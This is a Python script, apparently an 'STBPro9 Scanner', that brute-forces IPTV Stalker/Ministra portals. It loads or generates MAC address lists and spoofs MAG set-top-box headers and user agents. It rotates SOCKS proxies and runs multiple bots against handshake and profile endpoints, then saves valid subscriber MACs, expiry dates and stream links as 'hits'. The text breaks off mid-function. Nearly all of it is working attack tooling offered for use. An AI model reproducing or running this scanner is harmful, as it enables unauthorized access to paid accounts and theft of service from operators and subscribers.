# -*- coding: utf-8 -*-
import os, pip, datetime, os, socket, hashlib, json, random, sys, time, re
nickn = ''
nickn = ''
try:
    import androidhelper as sl4a
    ad = sl4a.Android()
except:
    pass

import subprocess
try:
    import threading
except:
    pass

import pathlib
subprocess.run(['clear', ''])
try:
    import requests
except:
    print('Requests modul not found \n Requests modul installing now... \n')
    pip.main(['install', 'requests'])

import requests
try:
    import sock
except:
    print('sock modul not found \n sock modul installing now \n')
    pip.main(['install', 'requests[socks]'])
    pip.main(['install', 'sock'])
    pip.main(['install', 'socks'])
    pip.main(['install', 'PySocks'])

import sock
subprocess.run(['clear', ''])
oto = 0
tur = 0
Seri = ''
csay = 0
import logging
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS = 'TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA:TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_AES_128_GCM_SHA256:TLS_RSA_WITH_AES_256_GCM_SHA384:TLS_RSA_WITH_AES_128_CBC_SHA:TLS_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_3DES_EDE_CBC_SHA:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256:TLS13-AES-256-GCM-SHA384:ECDHE:!COMP:TLS13-AES-256-GCM-SHA384:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256'
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
try:
    import cfscrape
    sesq = requests.Session()
    ses = cfscrape.create_scraper(sess=sesq)
except:
    ses = requests.Session()

logging.captureWarnings(True)
say1 = 0
say2 = 0
say = 0
sidepanel = 'fault'
imzayan = ''
bul = 0
hitc = 0
prox = 0
cpm = 0
rimi =  '\n\x1b[0m          \n    \x1b[0m'
rimi2 = '\n\x1b[91m          \n       🆂🆃🅱🅟🆁🅞 ν9 🆂🅲🅰🅽🅽🅴🆁        \n     ☛  ᴘʏ ᴄᴏɴғɪɴɢ ʙʏ  ₐₗᵢ ₐₗₕₑ𝕯ᵣₑ⁀➴   ☚        \n                                             \x1b[0m'
print(rimi)
nickn = input('\x1b[0m\x1b[33m\tEnter your nick name. \nIf nothing is written, then name "A_pxl" \nwill be automatically written to HiTS.FiLE\x1b[0;1m\n\n\n         Pres ENTER or writte\n         your nick= \x1b[0m')
if nickn == '':
    nickn = 'A_pxl'
subprocess.run(['clear', ''])
print(rimi2)
kisacikti = ''
pattern = '(\\w{2}:\\w{2}:\\w{2}:\\w{2}:\\w{2}:\\w{2})'
ozelmac = ''
nick = '@A_pxl'
wait = 1
names = ''
intro = '\n     1 \x1b[1;32m=⫸ \x1b[0m \x1b[33mᴘᴏʀᴛᴀʟ.ᴘʜᴘ \x1b[0m \n     2 \x1b[1;32m=⫸ \x1b[0m \x1b[33msᴇʀᴠᴇʀ.ᴘʜᴘ \x1b[0m \n     3 \x1b[1;32m=⫸ \x1b[0m \x1b[33msᴛᴀʟᴋᴇʀ_ᴘᴏʀᴛᴀʟ.ᴘʜᴘ \x1b[0m \n     4 \x1b[1;32m=⫸ \x1b[0m \x1b[33mʙs.ᴍᴀɢ.ᴘᴏʀᴛᴀʟ.ᴘʜᴘ \x1b[0m \n     5 \x1b[1;32m=⫸ \x1b[0m \x1b[33mᴘᴏʀᴛᴀʟᴄᴄ.ᴘʜᴘ \x1b[0m \n     6 \x1b[1;32m=⫸ \x1b[0m \x1b[33mᴍᴀɢᴀᴄᴄᴇss/ᴘᴏʀᴛᴀʟ.ᴘʜᴘ \x1b[0m \n     7 \x1b[1;32m=⫸ \x1b[0m \x1b[33mᴘᴏᴡᴇʀғᴜʟʟ/ᴘᴏʀᴛᴀʟ.ᴘʜᴘ \x1b[0m \n     8 \x1b[1;32m=⫸ \x1b[0m \x1b[33mᴍɪɴɪsᴛʀᴀ/ᴘᴏʀᴛᴀʟ.ᴘʜᴘ (xᴜɪ) \x1b[0m \n     9 \x1b[1;32m=⫸ \x1b[0m \x1b[33mᴍᴀɢʟᴏᴠᴇ/ᴘᴏʀᴛᴀʟ.ᴘʜᴘ (xᴜɪ) \x1b[0m \n    10 \x1b[1;32m=⫸ \x1b[0m \x1b[33mɢʜᴀɴᴅɪ_ᴘᴏʀᴛᴀʟ/sᴇʀᴠᴇʀ/ʟᴏᴀᴅ.ᴘʜᴘ \x1b[0m \n    11 \x1b[1;32m=⫸ \x1b[0m \x1b[33mʙʟᴏᴡᴘᴏʀᴛᴀʟ/ᴘᴏʀᴛᴀʟ.ᴘʜᴘ \x1b[0m \n    12 \x1b[1;32m=⫸ \x1b[0m \x1b[33mᴇᴍᴜ2/sᴇʀᴠᴇʀ/ʟᴏᴀᴅ.ᴘʜᴘ \x1b[0m \n    13 \x1b[1;32m=⫸ \x1b[0m \x1b[33mᴋ/ᴘᴏʀᴛᴀʟ.ᴘʜᴘ (xᴜɪ) \x1b[0m \n    14 \x1b[1;32m=⫸ \x1b[0m \x1b[33mᴘ/ᴘᴏʀᴛᴀʟ.ᴘʜᴘ (xᴜɪ) \x1b[0m \n    15 \x1b[1;32m=⫸ \x1b[0m \x1b[33mᴄ/ᴘᴏʀᴛᴀʟ.ᴘʜᴘ (xᴜɪ) \x1b[0m \n    16 \x1b[1;32m=⫸ \x1b[0m \x1b[33mᴄ/sᴇʀᴠᴇʀ/ʟᴏᴀᴅ.ᴘʜᴘ (xᴜɪ) \x1b[0m \n    17 \x1b[1;32m=⫸ \x1b[0m \x1b[33mᴅᴇʟᴋᴏ/ᴘᴏʀᴛᴀʟ.ᴘʜᴘ \x1b[0m \n    18 \x1b[1;32m=⫸ \x1b[0m \x1b[33mʀᴇᴀʟʙʟᴜᴇ.ᴘʜᴘ \x1b[0m  \n\n\n\x1b[1;44mPanel - Port = \x1b[0m\x1b[31m\x1b[1;37;41m'
a = 'panel-port = '
panel = input(intro)
print('\x1b[0m')
speed = ''
author = 'portal.php'
useragent = 'okhttp/4.7.1'
if panel == '0':
    author = input('write=')
    useragent = 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3'
    subprocess.run(['clear', ''])
    print(rimi)
    panel = input(intro)
if panel == '' or panel == '1':
    author = 'portal.php'
    useragent = 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3'
    subprocess.run(['clear', ''])
    print(rimi)
    panel = input(a)
if panel == '2':
    author = 'server/load.php'
    useragent = 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3'
    subprocess.run(['clear', ''])
    print(rimi)
    panel = input(a)
if panel == '3':
    author = 'server/load.php'
    subprocess.run(['clear', ''])
    print(rimi)
    panel = input(a)
if panel == '4':
    author = 'bs.mag.portal.php'
    subprocess.run(['clear', ''])
    print(rimi)
    panel = input(a)
if panel == '5':
    author = 'portalcc.php'
    subprocess.run(['clear', ''])
    print(rimi)
    panel = input(a)
if panel == '6':
    author = 'magaccess/portal.php'
    subprocess.run(['clear', ''])
    print(rimi)
    panel = input(a)
if panel == '7':
    author = 'powerfull/portal.php'
    subprocess.run(['clear', ''])
    print(rimi)
    panel = input(a)
if panel == '8':
    author = 'ministra/portal.php'
    subprocess.run(['clear', ''])
    print(rimi)
    panel = input(a)
if panel == '9':
    author = 'maglove/portal.php'
    subprocess.run(['clear', ''])
    print(rimi)
    panel = input(a)
if panel == '10':
    author = 'ghandi_portal/server/load.php'
    subprocess.run(['clear', ''])
    print(rimi)
    panel = input(a)
if panel == '11':
    author = 'blowportal/portal.php'
    subprocess.run(['clear', ''])
    print(rimi)
    panel = input(a)
if panel == '12':
    author = 'emu2/server/load.php'
    subprocess.run(['clear', ''])
    print(rimi)
    panel = input(a)
if panel == '13':
    author = 'k/portal.php'
    useragent = 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3'
    subprocess.run(['clear', ''])
    print(rimi)
    panel = input(a)
if panel == '14':
    author = 'p/portal.php'
    useragent = 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3'
    subprocess.run(['clear', ''])
    print(rimi)
    panel = input(a)
if panel == '15':
    author = 'c/portal.php'
    useragent = 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3'
    subprocess.run(['clear', ''])
    print(rimi)
    panel = input(a)
if panel == '16':
    author = 'c/server/load.php'
    subprocess.run(['clear', ''])
    print(rimi)
    panel = input(a)
if panel == '17':
    author = 'delko/portal.php'
    subprocess.run(['clear', ''])
    print(rimi)
    panel = input(a)
if panel == '18':
    realblue = 'real'
    subprocess.run(['clear', ''])
    print(rimi)
    panel = input(a)
realblue = ''
if panel == '20':
    realblue = 'real'
    subprocess.run(['clear', ''])
    print(rimi)
    panel = input(intro)
print('\x1b[0m')
print(panel)
subprocess.run(['clear', ''])
print('\x1b[1;40m' + rimi)
channels = '0'
subprocess.run(['clear', ''])
print(rimi2)
totLen = '000000'
filea = ''
macgen = (
 'D4:CF:F9:',
 '33:44:CF:',
 '10:27:BE:',
 'A0:BB:3E:',
 '55:93:EA:',
 '04:D6:AA:',
 '11:33:01:',
 '00:1C:19:',
 '1A:00:6A:',
 '1A:00:FB:',
 '00:A1:79:',
 '00:1B:79:',
 '00:2A:79:',
 '00:1A:79:')
if '1' == '1':
    say = 0
    dsy = ''
    dsy = '       \x1b[1;4;94;47m\x1b[0m\n'
    dir = '/sdcard/combo/'
    for files in os.listdir(dir):
        say = say + 1
        dsy = dsy + '\t' + str(say) + ' = ' + files + '\n'

    print('     CHOOSE YOUR MAC COMBO LIST !!!\n' + dsy + '\n\x1b[33m     Found ' + str(say) + ' MACs Combo files.\n\t')
    dosia = str(input(' \x1b[31m Combo No =\x1b[0m'))
    say = 0
    if dosia == '':
        print('\nIncorrect combo file selection...!')
        quit()
    if dosia == '0':
        print('\nIncorrect combo file selection...!')
        quit()
        ngen = str(macgen)
        ngen = ngen.count(',') + 1
        for xd in range(0, ngen):
            tire = '  》'
            if int(xd) < 9:
                tire = '   》'
            print(str(xd + 1) + tire + macgen[xd])

        mactur = input('SELECT MAC TYPE\n ANSWER =')
        if mactur == '':
            mactur = 14
        print(mactur)
        mactur = macgen[(int(mactur) - 1)]
        print(mactur)
        to = input('\n \t\t\n     Enter the Number of Macs.\n\n     How many MACs to generate? =')
        if to == '':
            to = 30000
        to = int(to)
        print(to)
    else:
        for files in os.listdir(dir):
            say = say + 1
            if dosia == str(say):
                filea = dir + files
                break

        say = 0
        if not filea == '':
            print(filea)
        else:
            subprocess.run(['clear', ''])
            subprocess.run(['clear', ''])
            print('Incorrect combo file selection...!')
            quit()
        c = open(filea, 'r', encoding='utf-8')
        totLen = c.readlines()
        to = len(totLen)
    subprocess.run(['clear', ''])
    print(rimi)
    beginn = ''
    if not beginn == '':
        beginn = int(beginn)
        csay = beginn
channels = '0'
channels = input('\x1b[1;40m\n  COUNTRIES, VOD AND SERIES \n\n  0 - No Categories \n  1 - Live Countries Only \n  2 - All Categories (LIVE-VOD-SER) \n\n\x1b[1m  Answer =')
if channels == '':
    channels = '0'
gsay = 0
vsay = 0
if panel == '':
    exit()
Rhit = '\x1b[33m'
Ehit = '\x1b[0m'
panel = panel.replace('http://', '')
panel = panel.replace('/c', '')
panel = panel.replace('/', '')
panel = panel.replace('stalker_portal', '/stalker_portal')
tkn1 = 'a'
tkn2 = 'a'
tkn3 = 'a'
tkn4 = 'a'
tkn5 = 'a'
pro1 = 'a'
pro2 = 'a'
pro3 = 'a'
trh1 = 'a'
trh2 = 'a'
trh3 = 'a'
ip = ''
fname = ''
adult = ''
play_token = ''
acount_id = ''
stb_id = ''
stb_type = ''
sespas = ''
stb_c = ''
timezon = ''
tloca = ''
subprocess.run(['clear', ''])
print(rimi)
acount_id = ''
a = '0123456789ABCDEF'
s = -1
ss = 0
sss = 0
ssss = 0
sd = 0
vpnsay = 0
hitsay = 0
onsay = 0
sdd = 0
vsay = 0
bad = 0
proxies = ''
proxi = input('\n   \n   Do you want to use Proxy?!\n    \n   1 - Yes\n   2 - No\n\n   1 or 2 = ')
subprocess.run(['clear', ''])
print(rimi2)
if proxi == '1':
    say = 0
    dsy = ''
    dir = '/sdcard/download/'
    for files in os.listdir(dir):
        if files.endswith('.txt'):
            say = say + 1
            dsy = dsy + '\t' + str(say) + '- ' + files + '\n'

    print('\n   Choose your proxys from the list below!\n    \n' + dsy + '\n\x1b[0m\tHere are ' + str(say) + " Proxys file found!\n\n   Tip: It's better to choose Proxy Socks5 !\n\t")
    dosia = str(input(' \x1b[0m  Proxy No =\x1b[0m'))
    say = 0
    for files in os.listdir(dir):
        if files.endswith('.txt'):
            say = say + 1
            if dosia == str(say):
                filea = dir + files

    say = 0
    proxies = ''
    print(filea)
    Proxy = filea
    c = open(Proxy, 'r')
    sock = c.readlines()
    prox = 0
    Proxy = filea
    subprocess.run(['clear', ''])
    subprocess.run(['clear', ''])
    pro = input('            \n    \n        🆂🆃🅱🅟🆁🅞 ν9  🆂🅲🅰🅽🅽🅴🆁         \n         ☛  ᴘʏ ᴄᴏɴғɪɴɢ ʙʏ ₐₗᵢ ₐₗₕₑ𝕯ᵣₑ⁀➴   ☚         \n            \n  PS: wait until proxy list is scanned!!           \n \n ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄\n                                             \n What is the proxy type you selected?\n \n\t1 - Free - Socks4 \n\t2 - Free - Socks5 \n    \n\tProxy Type=')
subprocess.run(['clear', ''])
print(rimi)
botsay = input('\n\n   \x1b[1;96mMULTI BOT!\x1b[0m\n   \n   \x1b[1;33mChoose from 1 to 30 number of Bots!\x1b[0m\n   \n      \n     \x1b[31mINFO FOR BETTER PERFORMANCE WITH HITS: \n   If you choose option Proxy, put Max 20 bots. \n - While without proxy put as many bots you want! \n      \n   \x1b[33mEnjoy the scann with STBPro9 by ₐₗᵢ ₐₗₕₑ𝕯ᵣₑ⁀➴   \x1b[0m\n      \n      \n   Answer=')
subprocess.run(['clear', ''])
print(rimi)
if botsay == '':
    botsay = int(4)
else:
    botsay = int(botsay)
    say = 1
    FileA = '/sdcard/●STBᴘʀᴏ3[' + panel.replace(':', '_').replace('/', '_') + ']@' + nickn + '[ʜɪᴛs].txt'

    def yaz(hits):
        file = open(FileA, 'a+', encoding='utf-8')
        file.write(hits)
        file.close()


    FileB = '/sdcard/✦STBᴘʀᴏ3[' + panel.replace(':', '_').replace('/', '_') + ']@' + nickn + '[ʜɪᴛs].txt'

    def yax(hits):
        file = open(FileB, 'a+', encoding='utf-8')
        file.write(hits)
        file.close()


    print('You are using Bots:' + str(botsay))
    print('PaneL: ' + str(panel))

    def month_string_to_number(ay):
        m = {'jan':1, 
         'feb':2, 
         'mar':3, 
         'apr':4, 
         'may':5, 
         'jun':6, 
         'jul':7, 
         'aug':8, 
         'sep':9, 
         'oct':10, 
         'nov':11, 
         'dec':12}
        s = ay.strip()[:3].lower()
        try:
            out = m[s]
            return out
        except:
            raise ValueError('Not a month')


    import time
    from datetime import date

    def tarih_clear(trh):
        ay = ''
        gun = ''
        yil = ''
        trai = ''
        my_date = ''
        sontrh = ''
        out = ''
        ay = str(trh.split(' ')[0])
        gun = str(trh.split(', ')[0].split(' ')[1])
        yil = str(trh.split(', ')[1])
        ay = str(month_string_to_number(ay))
        trai = str(gun) + '/' + str(ay) + '/' + str(yil)
        my_date = str(trai)
        if 1 == 1:
            d = date(int(yil), int(ay), int(gun))
            sontrh = time.mktime(d.timetuple())
            out = int((sontrh - time.time()) / 86400)
            return out


    macs = ''
    sayi = 1
    b1hitc = 0
    b2hitc = 0

    def randommac():
        try:
            genmac = str(mactur) + '%02x:%02x:%02x' % (random.randint(0, 256), random.randint(0, 256), random.randint(0, 256))
        except:
            pass

        genmac = genmac.replace(':100', ':10')
        return genmac


    url1 = 'http://' + panel + '/' + author + '?type=stb&action=handshake&prehash=false&JsHttpRequest=1-xml'
    url2 = 'http://' + panel + '/' + author + '?type=stb&action=get_profile&JsHttpRequest=1-xml'
    if realblue == 'real':
        url2 = 'http://' + panel + '/' + author + '?&action=get_profile&mac=' + macs + '&type=stb&hd=1&sn=&stb_type=MAG250&client_type=STB&image_version=218&device_id=&hw_version=1.7-BD-00&hw_version_2=1.7-BD-00&auth_second_step=1&video_out=hdmi&num_banks=2&metrics=%7B%22mac%22%3A%22' + macs + '%22%2C%22sn%22%3A%22%22%2C%22model%22%3A%22MAG250%22%2C%22type%22%3A%22STB%22%2C%22uid%22%3A%22%22%2C%22random%22%3A%22null%22%7D&ver=ImageDescription%3A%200.2.18-r14-pub-250%3B%20ImageDate%3A%20Fri%20Jan%2015%2015%3A20%3A44%20EET%202016%3B%20PORTAL%20version%3A%205.6.1%3B%20API%20Version%3A%20JS%20API%20version%3A%20328%3B%20STB%20API%20version%3A%20134%3B%20Player%20Engine%20version%3A%200x566'
    url3 = 'http://' + panel + '/' + author + '?type=account_info&action=get_main_info&JsHttpRequest=1-xml'
    url5 = 'http://' + panel + '/' + author + '?action=create_link&type=itv&cmd=ffmpeg%20http://localhost/ch/106422_&JsHttpRequest=1-xml'
    url6 = 'http://' + panel + '/' + author + '?type=itv&action=get_all_channels&force_ch_link_check=&JsHttpRequest=1-xml'
    liveurl = 'http://' + panel + '/' + author + '?action=get_genres&type=itv&JsHttpRequest=1-xml'
    vodurl = 'http://' + panel + '/' + author + '?action=get_categories&type=vod&JsHttpRequest=1-xml'
    seriesurl = 'http://' + panel + '/' + author + '?action=get_categories&type=series&JsHttpRequest=1-xml'

    def url(cid):
        url7 = 'http://' + panel + '/' + author + '?type=itv&action=create_link&cmd=ffmpeg%20http://localhost/ch/' + str(cid) + '_&series=&forced_storage=0&disable_ad=0&download=0&force_ch_link_check=0&JsHttpRequest=1-xml'
        return url7


    def hea1(macs):
        HEADERA = {'User-Agent':'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 1812 Mobile Safari/533.3', 
         'Referer':'http://' + panel + '/c/', 
         'Accept':'application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 
         'Cookie':'mac=' + macs + '; stb_lang=en; timezone=Europe/Paris;', 
         'Accept-Encoding':'gzip, deflate', 
         'Connection':'Keep-Alive', 
         'X-User-Agent':'Model: MAG254; Link: Ethernet'}
        return HEADERA


    class Proxies:

        def init(self):
            self.proxies = []

        def load_proxies(self, proxy_txt):
            with open(proxy_txt, 'r', errors='ignore') as (f):
                self.proxies = f.read().split('\n')

        def random_proxy(self, proxy_type):
            self.load_proxies(proxy_txt)
            proxy = random.choice(self.proxies)
            proxy = proxy.replace('\x00', '')
            proxy = proxy.replace('<br />', '')
            proxy = proxy.replace('<br/>', '')
            proxy_type = proxy_type.lower()
            if proxy_type == '1':
                return {'https': 'socks4://' + proxy}
            else:
                if proxy_type == '2':
                    return {'https': 'socks5://' + proxy}
                return {'https': proxy}


    token = ''
    data = ''
    if proxi == '1':
        if prox == len(sock) - 2:
            prox = 0
        else:
            if pro == '1':
                while 1:
                    try:
                        if prox == len(sock) - 2:
                            prox = 0
                        prox = prox + 1
                        pdata = sock[prox]
                        pdata = pdata.replace('\n', '')
                        print(pdata)
                        pip = pdata.split(':')[0]
                        pport = pdata.split(':')[1]
                        proxies = {'http':'socks4://' + pip + ':' + pport,  'https':'socks4://' + pip + ':' + pport}
                        print('\x1b[41mTotal Socks4\x1b[0m: ' + str(len(sock) - 1) + ' Run:' + str(prox) + ' Bad:' + str(bad))
                        res = ses.get(url1, proxies=proxies, headers=(hea1(macs)), timeout=2, verify=False)
                        data = str(res.text)
                        break
                    except:
                        bad = bad + 1

            if pro == '2':
                while 1:
                    try:
                        if prox == len(sock) - 2:
                            prox = 0
                        prox = prox + 1
                        pdata = sock[prox]
                        pdata = pdata.replace('\n', '')
                        print(pdata)
                        pip = pdata.split(':')[0]
                        pport = pdata.split(':')[1]
                        proxies = {'http':'socks5://' + pip + ':' + pport,  'https':'socks5://' + pip + ':' + pport}
                        print('\x1b[44mTotal Socks5\x1b[0m: ' + str(len(sock) - 1) + ' \x1b[33mRun\x1b[0m:' + str(prox) + ' \x1b[33mBad\x1b[0m: ' + str(bad))
                        res = ses.get(url1, proxies=proxies, headers=(hea1(macs)), timeout=2, verify=False)
                        data = str(res.text)
                        break
                    except:
                        bad = bad + 1

    else:
        bag1 = 0
        while 1:
            try:
                res = ses.get(url1, proxies=proxies, headers=(hea1(macs)), timeout=7, verify=False)
                data = str(res.text)
                break
            except:
                bag1 = bag1 + 1
                time.sleep(1)
                if bag1 == 12:
                    quit()

    bag1 = 0
    data = str(res.text)

def hea2(macs, token):
    HEADERd = {'User-Agent':'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 1812 Mobile Safari/533.3', 
     'Referer':'http://' + panel + '/c/', 
     'Accept':'application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 
     'Cookie':'mac=' + macs + '; stb_lang=en; timezone=Europe/Paris;', 
     'Accept-Encoding':'gzip, deflate', 
     'Connection':'Keep-Alive', 
     'X-User-Agent':'Model: MAG254; Link: Ethernet', 
     'Authorization':'Bearer ' + token}
    return HEADERd


def hea3():
    hea = {'Icy-MetaData':'1', 
     'User-Agent':'Lavf/57.83.100', 
     'Accept-Encoding':'identity', 
     'Host':panel, 
     'Accept':'*/*', 
     'Range':'bytes=0-', 
     'Connection':'close'}
    return hea


hityaz = 0

def hit(mac, trh, real, m3ulink, case, vpn, livelist, vodlist, serieslist, playerapi, SN, SNENC, SNCUT, DEV, DEVENC, SG, SING, SINGENC):
    global hitc
    global hitr
    global hityaz
    try:
        imza = '\n▂▂▂▂✧𝐀𝐋𝐁🔱𝐒𝐓𝐁✧▂▂▂▂\n╭⫸🆂🆃🅱️🅟🆁🅾️√9•𝕊𝕔𝕒𝕟𝕟𝕖𝕣\n├●ᴘᴀɴᴇʟ➢ http://' + str(panel) + '/c/\n├─●ᴍᴀᴄ➢ ' + str(mac) + '\n├●ᴇxᴘ➢ ' + str(trh) + '\n├●ᴠᴘɴᴄʜᴇᴄᴋ➢ ' + str(case) + '\n├●ʟᴏᴄᴀᴛɪᴏɴ➢ ' + str(vpn) + '\n├─✪ ʜɪᴛꜱ ʙʏ ☛ ' + str(nickn) + ' ☚\n╰─➤[ ✪ ᴘʏ ᴄᴏɴғɪɢ ʙʏ ₐₗᵢ ₐₗₕₑ𝕯ᵣₑ⁀➴  ✪ ]' + str(playerapi) + '\n╭⫸🅸🅟🆃🆅●🅟🅻🅐🆈🅴🅡🆂 \n├●ᴀɴᴅ➢ OTT, StbEmu, Stalker\n├●ɪᴏs➢ StbEmuTV, iSTB Player\n├●ᴘᴄ➢ SFVIP, Stalker Player\n╰─➤【 𝐑𝐢𝐦𝐢 𝐒𝐓𝐁𝐏𝐫𝐨𝟑 𝐒𝐜𝐚𝐧𝐧𝐞𝐫 】 \n╭⫸🅳🅴🆅🅸🅲🅴●🅸🅽🅵🅞 \n├●sɴ➢ ' + SNENC + '\n├●ɪᴅ1➢ ' + DEVENC + '\n├●ɪᴅ2➢ ' + SINGENC + '\n╰─●sɴᴄᴜᴛ➢ ' + SNCUT + '\n╭⫸🅼3🆄●🅒🅡🅔🅐🅣🅞🅡 \n├──✪ ʜɪᴛꜱ ʙʏ ☛ ' + str(nickn) + ' ☚\n╰─ⓊⓇⓁ➢ ' + str(m3ulink) + '\n'
        if channels == '1' or channels == '2':
            imza = imza + '╭⫸🅻🅸🆅🅴●🅻🅸🆂🆃 \n╰─➤' + str(livelist) + ''
        if channels == '2':
            imza = imza + '\n╭⫸🆅🅞🅳●🅻🅸🆂🆃 \n╰─➤' + str(vodlist) + 'ᴘʏ-ᴄᴏɴғɪɢ-ʙʏ-A_pxl\n╭⫸🆂🅴🆁🅸🅴🆂●🅻🅸🆂🆃 \n╰─➤' + str(serieslist) + '\n'
        if channels == '0' or channels == '1' or channels == '2':
            imza = imza + '✧𝐀𝐋𝐁🔱𝐒𝐓𝐁✧ [https://t.me/A_pxll]\n\n𝐒𝐓𝐁𝐏𝐫𝐨9 𝐒𝐜𝐚𝐧𝐧𝐞𝐫 ☞ ʜɪᴛꜱ ʙʏ ' + str(nickn) + '\n\n\n'
        print(imza)
        hityaz = hityaz + 1
        yax(imza)
        print(white)
        if hityaz >= hitc:
            hitr = '\x1b[1;33m'
    except:
        pass


cpm = 0
cpmx = 0
hitr = '\x1b[1;33m'
macv = 0
maca = 0

def echok(mac, bot, total, hitc, oran, tokenr, proxies):
    global bad
    global cpm
    global maca
    global macv
    global prox
    try:
        cpmx = time.time() - cpm
        cpmx = round(60 / cpmx)
        if str(cpmx) == '0':
            cpm = cpm
        else:
            cpm = cpmx
        if proxi == '1':
            echo = '\n╭⫷🆂🆃🅱🅟🅡🅞☛‌🇦\u200c‌🇱\u200c‌🇮\u200c☚🆂🅲🅰🅽🅽🅴🆁⫸      \n├● \x1b[0m\x1b[1;37mPaneL\x1b[0m➢ \x1b[33m' + str(panel) + '\x1b[0m \n├● \x1b[0m\x1b[1;37mMac\x1b[0m➢ \x1b[0m' + tokenr + str(mac) + ' \x1b[94mCPM➢' + str(cpm) + ' \x1b[1;33m\n├✪ \x1b[1;37mProxi\x1b[0m➢ \x1b[1;33m' + str(len(sock) - 1) + '\x1b[0m \x1b[44mRun➢' + str(prox) + ' \x1b[0m\x1b[41mBad➢' + str(bad) + ' \x1b[0m\n├● \x1b[1;32m' + str(bot) + ' \x1b[36mTotal➢' + str(total) + ' \x1b[0m \x1b[32mON➢' + str(maca) + ' \x1b[35m VPN➢' + str(macv) + ' \x1b[0m\n╰─☛  \x1b[0;4;32m√ᴇʀsɪᴏɴ3\x1b[0m' + str(hitr) + '▄︻HIT══ᕗ ' + str(hitc) + ' \x1b[0m ☚ \x1b[1;31m ' + str(oran) + '% \x1b[0m'
        else:
            echo = '\n╭⫷🆂🆃🅱🅟🆁🅞☛‌🇦\u200c‌🇱\u200c‌🇮\u200c☚🆂🅲🅰🅽🅽🅴🆁⫸      \n├─● \x1b[0m\x1b[1;37mPaneL\x1b[0m➢ \x1b[1m\x1b[1;100m\x1b[1m' + str(panel) + '\x1b[0m \n├─● \x1b[1;37mMac\x1b[0m➢ \x1b[0m' + tokenr + str(mac) + ' \x1b[94mCPM➢' + str(cpm) + ' \x1b[0m\n├ν3● \x1b[1;37mChecking\x1b[0m➢ \x1b[0m \x1b[42m ON ➢' + str(maca) + ' \x1b[0m  \x1b[45m VPN➢' + str(macv) + ' \x1b[0m\n╰─● \x1b[1;32m' + str(bot) + ' \x1b[36mTotal➢' + str(total) + ' \x1b[0m ' + str(hitr) + 'HIT➢' + str(hitc) + '  \x1b[1;31m' + str(oran) + '% \x1b[0m'
        print(echo)
        cpm = time.time()
    except:
        pass


def vpnip(ip):
    url9 = 'https://freegeoip.app/json/' + ip
    vpnip = ''
    data = ''
    try:
        res = ses.get(url9, timeout=7, verify=False)
        data = str(res.text)
        if '404 page' not in data:
            vpnips = data.split('"country_name":"')[1]
            vpn = vpnips.split('"')[0]
        else:
            vpn = '𝙐𝙣𝙠𝙣𝙤𝙬𝙣 𝙇𝙤𝙘𝙖𝙩𝙞𝙤𝙣'
    except:
        vpn = '𝙐𝙣𝙠𝙣𝙤𝙬𝙣 𝙇𝙤𝙘𝙖𝙩𝙞𝙤𝙣'

    return vpn


def goruntu(link):
    global maca
    global macv
    try:
        res = ses.get(link, headers=(hea3()), timeout=(2, 5), allow_redirects=False, stream=True)
        status = '𝙑𝙋𝙉 「 🅈🄴🅂 」 🔒 '
        if res.status_code == 302:
            status = '𝙑𝙋𝙉 「 ⓃⓄ 」 ✔️ '
    except:
        status = '𝙑𝙋𝙉 「 🅈🄴🅂 」 🔒 '

    if status == '𝙑𝙋𝙉 「 ⓃⓄ 」 ✔️ ':
        maca = maca + 1
    else:
        macv = macv + 1
    return status


tokenr = '\x1b[0m'

def hitprint(mac, trh):
    sound = '/sdcard/hit.mp3'
    file = pathlib.Path(sound)
    try:
        if file.exists():
            ad.mediaPlay(sound)
    except:
        pass

    print('\n       ✪ 🌟 🇭 🇮 🇹 🌟 ✪   \n      Mac: ' + str(mac) + ' \n ' + str(trh))


def list(listlink, macs, token, livel):
    global proxies
    kategori = ''
    data = ''
    bag = 0
    while True:
        try:
